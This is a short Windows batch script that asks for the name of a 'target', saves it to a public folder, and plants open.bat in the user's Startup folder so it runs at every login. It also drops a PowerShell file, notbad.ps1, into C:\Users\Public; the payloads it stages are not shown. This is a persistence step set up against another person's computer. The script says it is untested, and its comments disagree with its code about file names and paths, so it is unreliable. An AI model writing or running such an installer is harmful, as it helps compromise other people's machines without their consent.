:: Expect user to put everything in the Desktop
::  After that, when the script is run, it will move
::  `open.bat` to
::    %appdata%\Roaming\Microsoft\Windows
::        \StartMenu\Programs\Startup\open.bat
::  Then, move `notbad.bat` to C:\Users\Public\notbad.bat
:: This script has not been tested
color 2

set /p Target=Who is the target?
echo %Target%>C:\Users\Public\target.txt

move open.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat"
move notbad.ps1 C:\Users\Public\notbad.ps1
